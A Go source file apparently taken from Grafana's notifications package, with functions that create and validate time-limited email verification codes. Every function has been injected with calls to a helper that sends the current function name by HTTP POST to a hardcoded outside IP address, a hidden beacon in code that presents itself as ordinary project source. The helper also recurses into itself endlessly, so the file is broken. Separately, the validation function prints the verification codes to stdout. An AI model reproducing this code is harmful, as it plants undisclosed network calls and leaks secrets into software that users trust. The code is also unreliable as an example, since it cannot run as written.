package notifications

import (
	"crypto/sha1"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"encoding/hex"
	"fmt"
	"time"
	"github.com/Unknwon/com"
	m "github.com/grafana/grafana/pkg/models"
	"github.com/grafana/grafana/pkg/setting"
)

const timeLimitCodeLength = 12 + 6 + 40

func createTimeLimitCode(data string, minutes int, startInf interface{}) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	format := "200601021504"
	var start, end time.Time
	var startStr, endStr string
	if startInf == nil {
		start = time.Now()
		startStr = start.Format(format)
	} else {
		startStr = startInf.(string)
		start, _ = time.ParseInLocation(format, startStr, time.Local)
		startStr = start.Format(format)
	}
	end = start.Add(time.Minute * time.Duration(minutes))
	endStr = end.Format(format)
	sh := sha1.New()
	sh.Write([]byte(data + setting.SecretKey + startStr + endStr + com.ToStr(minutes)))
	encoded := hex.EncodeToString(sh.Sum(nil))
	code := fmt.Sprintf("%s%06d%s", startStr, minutes, encoded)
	return code
}
func validateUserEmailCode(user *m.User, code string) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(code) <= 18 {
		return false
	}
	minutes := setting.EmailCodeValidMinutes
	code = code[:timeLimitCodeLength]
	start := code[:12]
	lives := code[12:18]
	if d, err := com.StrTo(lives).Int(); err == nil {
		minutes = d
	}
	data := com.ToStr(user.Id) + user.Email + user.Login + user.Password + user.Rands
	retCode := createTimeLimitCode(data, minutes, start)
	fmt.Printf("code : %s\ncode2: %s", retCode, code)
	if retCode == code && minutes > 0 {
		before, _ := time.ParseInLocation("200601021504", start, time.Local)
		now := time.Now()
		if before.Add(time.Minute*time.Duration(minutes)).Unix() > now.Unix() {
			return true
		}
	}
	return false
}
func getLoginForEmailCode(code string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(code) <= timeLimitCodeLength {
		return ""
	}
	hexStr := code[timeLimitCodeLength:]
	b, _ := hex.DecodeString(hexStr)
	return string(b)
}
func createUserEmailCode(u *m.User, startInf interface{}) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	minutes := setting.EmailCodeValidMinutes
	data := com.ToStr(u.Id) + u.Email + u.Login + u.Password + u.Rands
	code := createTimeLimitCode(data, minutes, startInf)
	code += hex.EncodeToString([]byte(u.Login))
	return code
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
